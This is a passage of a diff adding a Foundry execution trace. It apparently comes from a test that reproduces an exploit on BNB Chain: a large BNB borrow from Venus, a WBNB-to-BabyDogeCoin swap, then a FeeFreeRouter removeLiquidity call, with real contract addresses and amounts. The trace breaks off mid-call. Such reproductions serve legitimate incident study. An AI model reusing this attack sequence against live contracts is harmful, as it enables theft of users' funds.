+    │   │   │   │   │   │   │   ├─ [1593] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::getAssetsIn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] [0xfD5840Cd36d94D7229439859C0112a4185BC0255, 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0xA07c5b74C9B40447a954e1466938b865b6BBea36]
+    │   │   │   │   │   │   │   └─ ← [Return] [0xfD5840Cd36d94D7229439859C0112a4185BC0255, 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0xA07c5b74C9B40447a954e1466938b865b6BBea36]
+    │   │   │   │   │   │   ├─ [7074] vUSDT::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [5549] vUSDT::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [3664] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [531] USDT::balanceOf(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 85667293362416235809024304 [8.566e25]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 82945848211975141 [8.294e16], 0, 223379742247415412383608590 [2.233e26]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000126aecf3a44abe50000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b8c680177952a8b8ccef0e
+    │   │   │   │   │   │   │   └─ ← [Return] 0, 82945848211975141 [8.294e16], 0, 223379742247415412383608590 [2.233e26]
+    │   │   │   │   │   │   ├─ [1550] Unitroller::markets(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [855] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::markets(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] true, 800000000000000000 [8e17], true
+    │   │   │   │   │   │   │   └─ ← [Return] true, 800000000000000000 [8e17], true
+    │   │   │   │   │   │   ├─ [1160] Unitroller::oracle() [staticcall]
+    │   │   │   │   │   │   │   ├─ [492] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::oracle() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   ├─ [15501] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [14932] 0xfE872ddeAe0A53486c25ed882786D592e302d80C::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [470] vUSDT::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] USDT: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   │   │   │   │   ├─ [470] vUSDT::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] USDT: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   │   │   │   │   ├─ [10119] 0x1B2103441A0A108daD8848D8F5d790e4D402921F::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [9550] 0xEebBfFC42e26386C631914e69B86aD398e91DD7f::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [470] vUSDT::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] USDT: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   │   │   │   │   │   │   ├─ [425] USDT::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   │   │   │   ├─ [1140] 0xB97Ad0E74fa7d920791E90258A6E2085088b4320::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [298] 0x2dc202b56A03667cC240B290c2BE2b8453E89eA1::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   ├─ [3143] 0xB97Ad0E74fa7d920791E90258A6E2085088b4320::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1410] 0x2dc202b56A03667cC240B290c2BE2b8453E89eA1::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 34996 [3.499e4], 99995000 [9.999e7], 1687349434 [1.687e9], 1687349434 [1.687e9], 34996 [3.499e4]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 36893488147419138228 [3.689e19], 99995000 [9.999e7], 1687349434 [1.687e9], 1687349434 [1.687e9], 36893488147419138228 [3.689e19]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   │   ├─ [7074] vBUSD::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [5549] vBUSD::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [3664] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [531] BUSD::balanceOf(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 23905043702920857656875424 [2.39e25]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 53675881533888187 [5.367e16], 0, 221538417014331993455068123 [2.215e26]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000beb1ee0bd556bb0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b74095a69aa07cc5f403db
+    │   │   │   │   │   │   │   └─ ← [Return] 0, 53675881533888187 [5.367e16], 0, 221538417014331993455068123 [2.215e26]
+    │   │   │   │   │   │   ├─ [1550] Unitroller::markets(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [855] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::markets(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] true, 825000000000000000 [8.25e17], true
+    │   │   │   │   │   │   │   └─ ← [Return] true, 825000000000000000 [8.25e17], true
+    │   │   │   │   │   │   ├─ [1160] Unitroller::oracle() [staticcall]
+    │   │   │   │   │   │   │   ├─ [492] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::oracle() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   ├─ [15501] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [14932] 0xfE872ddeAe0A53486c25ed882786D592e302d80C::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [470] vBUSD::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]
+    │   │   │   │   │   │   │   │   ├─ [470] vBUSD::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]
+    │   │   │   │   │   │   │   │   ├─ [10119] 0x1B2103441A0A108daD8848D8F5d790e4D402921F::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [9550] 0xEebBfFC42e26386C631914e69B86aD398e91DD7f::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [470] vBUSD::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]
+    │   │   │   │   │   │   │   │   │   │   ├─ [425] BUSD::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   │   │   │   ├─ [1140] 0xcBb98864Ef56E9042e7d2efef76141f15731B82f::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [298] 0x7A6BB3a3C0C99bA43564017D7523a74BA0f7cB5d::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   ├─ [3143] 0xcBb98864Ef56E9042e7d2efef76141f15731B82f::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1410] 0x7A6BB3a3C0C99bA43564017D7523a74BA0f7cB5d::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 33916 [3.391e4], 100005535 [1e8], 1687349803 [1.687e9], 1687349803 [1.687e9], 33916 [3.391e4]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 36893488147419137148 [3.689e19], 100005535 [1e8], 1687349803 [1.687e9], 1687349803 [1.687e9], 36893488147419137148 [3.689e19]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   │   ├─ [2774] vBNB::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 224118239498985708585930668 [2.241e26]
+    │   │   │   │   │   │   ├─ [1550] Unitroller::markets(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [855] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::markets(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] true, 750000000000000000 [7.5e17], true
+    │   │   │   │   │   │   │   └─ ← [Return] true, 750000000000000000 [7.5e17], true
+    │   │   │   │   │   │   ├─ [1160] Unitroller::oracle() [staticcall]
+    │   │   │   │   │   │   │   ├─ [492] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::oracle() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   ├─ [11845] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [11276] 0xfE872ddeAe0A53486c25ed882786D592e302d80C::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [8369] 0x1B2103441A0A108daD8848D8F5d790e4D402921F::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [7800] 0xEebBfFC42e26386C631914e69B86aD398e91DD7f::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [1140] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [298] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   ├─ [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 2207163 [2.207e6], 24763280000 [2.476e10], 1687350205 [1.687e9], 1687350205 [1.687e9], 2207163 [2.207e6]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 36893488147421310395 [3.689e19], 24763280000 [2.476e10], 1687350205 [1.687e9], 1687350205 [1.687e9], 36893488147421310395 [3.689e19]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   ├─ [1162] Unitroller::vaiController() [staticcall]
+    │   │   │   │   │   │   │   ├─ [494] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::vaiController() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000004065d34c6b18ce4370ced1cebde94865dbfafe
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000004065d34c6b18ce4370ced1cebde94865dbfafe
+    │   │   │   │   │   │   ├─ [4310] 0x004065D34C6b18cE4370ced1CeBDE94865DbFAFE::getVAIRepayAmount(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [3639] 0x8A1e5Db8f622B97f4bCceC4684697199C1B1D11b::getVAIRepayAmount(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [1230] Unitroller::mintedVAIs(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [559] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::mintedVAIs(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008588edc69fcfcf1ebb0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   ├─ [365] vBNB::borrowIndex() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1234470480956995732 [1.234e18]
+    │   │   │   │   │   ├─ [410] vBNB::totalBorrows() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 527739152458341217189326 [5.277e23]
+    │   │   │   │   │   ├─ [561] 0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63::balanceOf(Unitroller: [0xfD36E2c2a6789Db23113685031d7F16329158384]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 14801404367740170864091001 [1.48e25]
+    │   │   │   │   │   ├─ [729] vBNB::borrowBalanceStored(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ emit DistributedBorrowerVenus(param0: vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 3541889787173868147384486900713325815 [3.541e36])
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [55] ContractTest::receive{value: 99463293803544699126223}()
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ emit Borrow(borrower: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], borrowAmount: 99463293803544699126223 [9.946e22], accountBorrows: 99463293803544699126223 [9.946e22], totalBorrows: 627202446261885916315549 [6.272e23])
+    │   │   │   ├─ [1015] Unitroller::borrowVerify(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99463293803544699126223 [9.946e22])
+    │   │   │   │   ├─ [408] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::borrowVerify(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99463293803544699126223 [9.946e22]) [delegatecall]
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [32602] BabyDogeCoin::balanceOf(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de]) [staticcall]
+    │   │   │   └─ ← [Return] 202648433152251443074066 [2.026e23]
+    │   │   ├─ [431] BabyDogeCoin::numTokensSellToAddToLiquidity() [staticcall]
+    │   │   │   └─ ← [Return] 210000000000000000000000 [2.1e23]
+    │   │   ├─ [42790] BabyDogeRouter::getAmountsIn(7351566846748556925934 [7.351e21], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xc748673057861a797275CD8A068AbB95A902e8de]) [staticcall]
+    │   │   │   ├─ [540] BabyDogeRouterPair::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 30722381124782318164506 [3.072e22], 5128829893773676863227314 [5.128e24], 1687350211 [1.687e9]
+    │   │   │   ├─ [38033] BabyDogeRouter::transactionFee(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   ├─ [32602] BabyDogeCoin::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 10000000000000 [1e13]
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000f4240
+    │   │   │   └─ ← [Return] [44100086754764431202 [4.41e19], 7351566846748556925934 [7.351e21]]
+    │   │   ├─ [2074] WBNB::deposit{value: 99463293803544699126223}()
+    │   │   │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 99463293803544699126223 [9.946e22])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [24420] WBNB::approve(BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], 44100086754764431202 [4.41e19])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], value: 44100086754764431202 [4.41e19])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [260520] BabyDogeRouter::swapExactTokensForTokensSupportingFeeOnTransferTokens(44100086754764431202 [4.41e19], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xc748673057861a797275CD8A068AbB95A902e8de], FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 1687350211 [1.687e9])
+    │   │   │   ├─ [4148] WBNB::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], 44100086754764431202 [4.41e19])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], value: 44100086754764431202 [4.41e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [32602] BabyDogeCoin::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [540] BabyDogeRouterPair::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 30722381124782318164506 [3.072e22], 5128829893773676863227314 [5.128e24], 1687350211 [1.687e9]
+    │   │   │   ├─ [534] WBNB::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   └─ ← [Return] 30766481211537082595708 [3.076e22]
+    │   │   │   ├─ [32602] BabyDogeCoin::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 10000000000000 [1e13]
+    │   │   │   ├─ [145025] BabyDogeRouterPair::swap(0, 7351566846748556926023 [7.351e21], FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 0x)
+    │   │   │   │   ├─ [131620] BabyDogeCoin::transfer(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 7351566846748556926023 [7.351e21])
+    │   │   │   │   │   ├─ emit Transfer(from: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 7351566846748556926023 [7.351e21])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 30766481211537082595708 [3.076e22]
+    │   │   │   │   ├─ [744] BabyDogeCoin::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5121478326926928306301291 [5.121e24]
+    │   │   │   │   ├─ emit Sync(reserve0: 30766481211537082595708 [3.076e22], reserve1: 5121478326926928306301291 [5.121e24])
+    │   │   │   │   ├─ emit Swap(sender: BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], amount0In: 44100086754764431202 [4.41e19], amount1In: 0, amount0Out: 0, amount1Out: 7351566846748556926023 [7.351e21], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [32602] BabyDogeCoin::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   │   │   └─ ← [Return] 7351566846748556926023 [7.351e21]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [391927] FeeFreeRouter::removeLiquidity(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 1000000000 [1e9], 0, 0, BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], 1687350211 [1.687e9])
+    │   │   │   ├─ [644] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::getPair(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   │   │   └─ ← [Return] BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]
+    │   │   │   ├─ [26002] BabyDogeRouterPair::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 1000000000 [1e9])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 1000000000 [1e9])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2583] BabyDogeRouterPair::allowance(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47]) [staticcall]
+    │   │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    │   │   │   ├─ [201793] BabyDogeRouter::removeLiquidity(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 1000000000 [1e9], 0, 0, FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 1687350211 [1.687e9])
+    │   │   │   │   ├─ [25399] BabyDogeRouterPair::transferFrom(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], 1000000000 [1e9])
+    │   │   │   │   │   ├─ emit Transfer(from: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], to: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], value: 1000000000 [1e9])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [173903] BabyDogeRouterPair::burn(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e])
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 30766481211537082595708 [3.076e22]
+    │   │   │   │   │   ├─ [744] BabyDogeCoin::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 5121478326926928306301291 [5.121e24]
+    │   │   │   │   │   ├─ [338] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::feeTo() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x1551EAC5D2EDAa634f713A526866Ad83b82b5209
+    │   │   │   │   │   ├─ [381] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::feeToTreasury() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000001551eac5d2edaa634f713a526866ad83b82b5209
+    │   │   │   │   │   ├─ emit Transfer(from: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], to: 0x0000000000000000000000000000000000000000, value: 1000000000 [1e9])
+    │   │   │   │   │   ├─ [23162] WBNB::transfer(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 79237342 [7.923e7])
+    │   │   │   │   │   │   ├─ emit Transfer(from: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 79237342 [7.923e7])
+    │   │   │   │   │   │   └─ ← [Return] true
